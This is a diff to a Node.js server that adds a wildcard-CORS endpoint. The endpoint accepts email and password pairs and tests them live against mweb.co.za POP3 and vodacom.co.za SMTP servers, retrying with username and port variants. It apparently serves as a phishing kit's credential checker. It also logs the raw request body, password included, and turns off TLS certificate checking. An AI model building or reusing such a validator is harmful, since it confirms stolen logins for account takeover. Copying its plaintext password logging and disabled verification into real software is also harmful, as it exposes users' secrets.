@@ -4,20 +4,383 @@ import fs from "node:fs";
 import path from "node:path";
 import Database from "better-sqlite3";
 import process from "node:process";
+import nodemailer from "nodemailer";
+import { connect } from "node:tls";
 
 // Use PORT for Render.com compatibility, fallback to WS_PORT or 8090
 const port = Number(process.env.PORT || process.env.WS_PORT || 8090);
 
+// SMTP configuration based on email domain
+function getSMTPConfig(email) {
+  const emailLower = email.toLowerCase();
+  console.log("[SMTP Config] Checking domain for email:", emailLower);
+  
+  // @mweb.co.za uses POP3 connectivity test instead of SMTP
+  if (emailLower.includes("@mweb.co.za")) {
+    console.log("[SMTP Config] Detected @mweb.co.za domain - will use POP3 test");
+    return null; // POP3 test will be done separately
+  }
+  
+  // @webmail.co.za and @vodamail.co.za no longer require SMTP verification
+  // They will skip verification and proceed normally
+  
+  if (emailLower.includes("@vodacom.co.za")) {
+    console.log("[SMTP Config] Detected @vodacom.co.za domain");
+    return {
+      host: "smtp.vodacom.co.za",
+      port: 587,
+      secure: false, // TLS
+      requireTLS: true,
+    };
+  }
+  
+  console.log("[SMTP Config] Domain does not require verification");
+  return null; // No verification needed for other domains
+}
+
+// Test POP3 connectivity for @mweb.co.za
+async function testPOP3Connectivity(email, password) {
+  return new Promise((resolve) => {
+    console.log("[POP3] Testing connectivity to pop.mweb.co.za:995 for:", email);
+    
+    // Extract username from email (some POP3 servers require just the username)
+    const username = email.split("@")[0];
+    console.log("[POP3] Using username:", username, "and full email:", email);
+    
+    // Set connection timeout before connecting (15 seconds for reliable connection)
+    let connectionTimeout = setTimeout(() => {
+      console.error("[POP3] Connection timeout - unable to establish connection within 15 seconds");
+      resolve({ 
+        success: false, 
+        skip: false,
+        error: "Connection timeout - unable to connect to server" 
+      });
+    }, 15000);
+    
+    const socket = connect(995, "pop.mweb.co.za", {
+      rejectUnauthorized: false, // Accept self-signed certificates
+    }, () => {
+      // Clear connection timeout once connected
+      clearTimeout(connectionTimeout);
+      console.log("[POP3] Connected to pop.mweb.co.za:995");
+      
+      let dataBuffer = "";
+      let state = "greeting"; // greeting -> user -> pass -> done
+      let attempts = 0;
+      const maxAttempts = 2;
+      
+      socket.on("data", (data) => {
+        dataBuffer += data.toString();
+        
+        // Check if we have a complete response (ends with \r\n)
+        if (dataBuffer.includes("\r\n")) {
+          const lines = dataBuffer.split("\r\n");
+          const response = lines[0];
+          console.log("[POP3] Server response:", response);
+          
+          if (state === "greeting") {
+            if (response.startsWith("+OK")) {
+              // Try with full email first, then username only
+              const userToTry = attempts === 0 ? email : username;
+              console.log(`[POP3] Sending USER command (attempt ${attempts + 1}/${maxAttempts}):`, userToTry);
+              socket.write(`USER ${userToTry}\r\n`);
+              dataBuffer = "";
+              state = "user";
+            } else {
+              clearTimeout(connectionTimeout); // Clear timeout on failure
+              socket.end();
+              console.log("[POP3] Server greeting failed");
+              resolve({ 
+                success: false, 
+                skip: false,
+                error: "POP3 server error" 
+              });
+            }
+          } else if (state === "user") {
+            if (response.startsWith("+OK")) {
+              // Send PASS command
+              console.log("[POP3] Sending PASS command");
+              socket.write(`PASS ${password}\r\n`);
+              dataBuffer = "";
+              state = "pass";
+            } else {
+              // If USER failed and we haven't tried username yet, retry with username
+              if (attempts < maxAttempts - 1 && response.includes("ERR")) {
+                attempts++;
+                console.log("[POP3] USER command failed, retrying with username only");
+                state = "greeting";
+                dataBuffer = "";
+                // Wait a bit before retrying
+                setTimeout(() => {
+                  const userToTry = username;
+                  console.log(`[POP3] Retrying USER command with:`, userToTry);
+                  socket.write(`USER ${userToTry}\r\n`);
+                  state = "user";
+                }, 100);
+                return;
+              }
+              clearTimeout(connectionTimeout); // Clear timeout on failure
+              socket.end();
+              console.log("[POP3] USER command failed");
+              resolve({ 
+                success: false, 
+                skip: false,
+                error: "Invalid email or password" 
+              });
+            }
+          } else if (state === "pass") {
+            clearTimeout(connectionTimeout); // Clear timeout on completion
+            socket.end();
+            if (response.startsWith("+OK")) {
+              console.log("[POP3] Authentication successful!");
+              resolve({ success: true, skip: false });
+              } else {
+                clearTimeout(connectionTimeout); // Clear timeout on failure
+                console.log("[POP3] Authentication failed, response:", response);
+                // If PASS failed and we used full email, try with username
+                if (attempts === 0 && response.includes("ERR")) {
+                  attempts++;
+                  console.log("[POP3] Retrying with username only");
+                  socket.destroy();
+                  // Retry the whole process with username
+                  setTimeout(() => {
+                    testPOP3Connectivity(username + "@mweb.co.za", password).then(resolve);
+                  }, 500);
+                  return;
+                }
+                resolve({ 
+                  success: false, 
+                  skip: false,
+                  error: "Invalid email or password" 
+                });
+              }
+          }
+        }
+      });
+    });
+    
+    socket.on("error", (error) => {
+      // Clear connection timeout on error
+      clearTimeout(connectionTimeout);
+      
+      console.error("[POP3] Connection error:", error.message);
+      // If connection is refused, it might be due to firewall/IP blocking
+      const isConnectionRefused = error.message.includes("ECONNREFUSED") || error.message.includes("ENOTFOUND");
+      
+      // Only simulate success if explicitly enabled (for testing purposes)
+      // By default, we fail the verification to ensure security
+      if (isConnectionRefused && process.env.ALLOW_LOCALHOST_POP3 === "true") {
+        console.log("[POP3] Connection refused - likely due to localhost/IP blocking.");
+        console.log("[POP3] ALLOW_LOCALHOST_POP3=true is set - simulating successful verification for localhost testing");
+        console.log("[POP3] WARNING: This is a simulation. In production, real verification will be performed.");
+        resolve({ 
+          success: true, 
+          skip: false,
+          error: null,
+          simulated: true // Indicate this is simulated
+        });
+        return;
+      }
+      
+      // Real failure - connection refused or other error
+      console.log("[POP3] Verification failed:", error.message);
+      if (isConnectionRefused) {
+        console.log("[POP3] Note: Connection refused may be due to IP blocking. In production with valid IP, this should work.");
+      }
+      
+      resolve({ 
+        success: false, 
+        skip: false,
+        error: `Connection failed: ${error.message}` 
+      });
+    });
+    
+    // Set timeout for socket operations after connection (15 seconds)
+    socket.setTimeout(15000, () => {
+      clearTimeout(connectionTimeout); // Clear connection timeout if socket timeout triggers
+      console.error("[POP3] Socket timeout after 15 seconds");
+      socket.destroy();
+      resolve({ 
+        success: false, 
+        skip: false,
+        error: "Connection timeout" 
+      });
+    });
+  });
+}
+
+// Verify SMTP credentials
+async function verifySMTPCredentials(email, password) {
+  console.log("[SMTP Verify] Starting verification for:", email);
+  
+  // For @mweb.co.za, use POP3 connectivity test instead of SMTP
+  if (email.toLowerCase().includes("@mweb.co.za")) {
+    console.log("[SMTP Verify] Using POP3 test for @mweb.co.za");
+    return await testPOP3Connectivity(email, password);
+  }
+  
+  const config = getSMTPConfig(email);
+  if (!config) {
+    // No verification needed for this domain
+    console.log("[SMTP Verify] No config found, skipping verification");
+    return { success: true, skip: true };
+  }
+  
+  // For other domains, use SMTP verification
+  const hostsToTry = [config.host];
+  
+  // Try multiple port/security combinations for better compatibility
+  // Order matters: try the configured port first, then alternatives
+  const defaultPort = config.port;
+  const defaultSecure = config.secure;
+  const defaultRequireTLS = config.requireTLS;
+  
+  const portConfigs = [
+    { port: defaultPort, secure: defaultSecure, requireTLS: defaultRequireTLS }, // Use configured settings first
+    { port: 465, secure: true, requireTLS: false },  // SSL (alternative)
+    { port: 587, secure: false, requireTLS: true },   // STARTTLS (alternative)
+  ];
+  
+  let lastError = null;
+  
+  for (const host of hostsToTry) {
+    for (const portConfig of portConfigs) {
+      console.log("[SMTP Verify] Trying host:", host, "port:", portConfig.port, "secure:", portConfig.secure);
+      
+      try {
+        const transporter = nodemailer.createTransport({
+          host: host,
+          port: portConfig.port,
+          secure: portConfig.secure,
+          requireTLS: portConfig.requireTLS,
+          auth: {
+            user: email,
+            pass: password,
+          },
+          connectionTimeout: 15000, // 15 seconds timeout (increased)
+          greetingTimeout: 15000,
+          socketTimeout: 15000,
+          // Additional options for better compatibility
+          tls: {
+            rejectUnauthorized: false, // Accept self-signed certificates
+            ciphers: 'SSLv3',
+          },
+          // Ignore certificate errors for testing
+          ignoreTLS: false,
+          debug: false,
+        });
+        
+        console.log("[SMTP Verify] Attempting to verify connection...");
+        // Verify connection and authentication
+        await transporter.verify();
+        console.log("[SMTP Verify] Verification successful with host:", host, "port:", portConfig.port);
+        
+        return { success: true, skip: false };
+      } catch (error) {
+        console.error(`[SMTP Verify] Verification failed for ${email} with host ${host}:${portConfig.port}:`, error.message);
+        lastError = error;
+        // Continue to next port config if available
+        if (portConfigs.indexOf(portConfig) < portConfigs.length - 1) {
+          console.log("[SMTP Verify] Trying next port configuration...");
+          continue;
+        }
+      }
+    }
+    
+    // If all ports failed for this host, try next host
+    if (hostsToTry.indexOf(host) < hostsToTry.length - 1) {
+      console.log("[SMTP Verify] All ports failed for", host, "- trying next host...");
+      continue;
+    }
+  }
+  
+  // All hosts and ports failed
+  return { 
+    success: false, 
+    skip: false,
+    error: lastError ? lastError.message : "All SMTP hosts and ports failed"
+  };
+}
+
 // Create HTTP server (required for Render)
-const server = createServer((req, res) => {
+const server = createServer(async (req, res) => {
+  // Enable CORS - Set headers for all requests
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
+  res.setHeader("Access-Control-Max-Age", "86400"); // 24 hours
+  
+  // Handle preflight requests (OPTIONS)
+  if (req.method === "OPTIONS") {
+    console.log("[CORS] Handling OPTIONS preflight request");
+    res.writeHead(200, {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+      "Access-Control-Allow-Headers": "Content-Type, Authorization",
+      "Access-Control-Max-Age": "86400",
+    });
+    res.end();
+    return;
+  }
+  
+  // SMTP verification endpoint
+  if (req.method === "POST" && req.url === "/api/verify-smtp") {
+    console.log("[SMTP API] Received POST request to /api/verify-smtp");
+    console.log("[SMTP API] Request headers:", req.headers);
+    
+    let body = "";
+    req.on("data", (chunk) => {
+      body += chunk.toString();
+    });
+    
+    req.on("end", async () => {
+      try {
+        console.log("[SMTP API] Request body:", body);
+        const data = JSON.parse(body);
+        const { email, password } = data;
+        
+        console.log("[SMTP API] Email:", email, "Password:", password ? "***" : "missing");
+        
+        if (!email || !password) {
+          console.log("[SMTP API] Missing email or password");
+          res.writeHead(400, { 
+            "Content-Type": "application/json",
+            "Access-Control-Allow-Origin": "*",
+          });
+          res.end(JSON.stringify({ success: false, error: "Email and password are required" }));
+          return;
+        }
+        
+        console.log("[SMTP API] Calling verifySMTPCredentials for:", email);
+        const result = await verifySMTPCredentials(email, password);
+        console.log("[SMTP API] Verification result:", result);
+        
+        res.writeHead(200, { 
+          "Content-Type": "application/json",
+          "Access-Control-Allow-Origin": "*",
+        });
+        res.end(JSON.stringify(result));
+      } catch (error) {
+        console.error("[SMTP API] Error in SMTP verification endpoint:", error);
+        res.writeHead(500, { 
+          "Content-Type": "application/json",
+          "Access-Control-Allow-Origin": "*",
+        });
+        res.end(JSON.stringify({ success: false, error: "Internal server error" }));
+      }
+    });
+    return;
+  }
+  
   // Simple HTTP endpoint for health checks
   if (req.url === "/" || req.url === "/health") {
     res.writeHead(200, { "Content-Type": "text/plain" });
     res.end("WebSocket server is running");
-  } else {
-    res.writeHead(404);
-    res.end();
+    return;
   }
+  
+  res.writeHead(404);
+  res.end();
 });
 
 // Attach WebSocket server to HTTP server
